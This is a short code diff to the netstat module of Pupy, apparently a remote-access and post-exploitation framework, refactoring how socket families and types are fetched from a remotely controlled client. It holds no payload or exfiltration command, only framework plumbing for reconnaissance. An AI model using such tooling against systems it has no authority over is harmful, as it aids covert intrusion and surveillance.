@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 from pupylib.PupyCmd import PupyCmd
-from pupylib.utils.rpyc_utils import obtain
 from pupylib.utils.term import colorize
 from modules.lib.utils.shell_exec import shell_exec
 from collections import OrderedDict
@@ -34,9 +33,19 @@ class NetStatModule(PupyModule):
             rpupyps = self.client.remote('pupyps')
             connections = self.client.remote('pupyps', 'connections')
 
+            families = {
+                int(k):v for k,v in self.client.remote_const(
+                    'pupyps', 'families'
+                ).iteritems()
+            }
+
+            socktypes = {
+                int(k):v for k,v in self.client.remote_const(
+                    'pupyps', 'socktypes'
+                ).iteritems()
+            }
+
             data = connections()
-            sock = { int(x):y for x,y in obtain(rpupyps.socktypes).iteritems() }
-            families = { int(x):y for x,y in obtain(rpupyps.families).iteritems() }
 
             limit = []
 
@@ -55,7 +64,7 @@ class NetStatModule(PupyModule):
 
                 color = ""
                 family = families[connection['family']]
-                stype = sock[connection['type']]
+                stype = socktypes[connection['type']]
 
                 if limit and not stype in limit:
                     continue
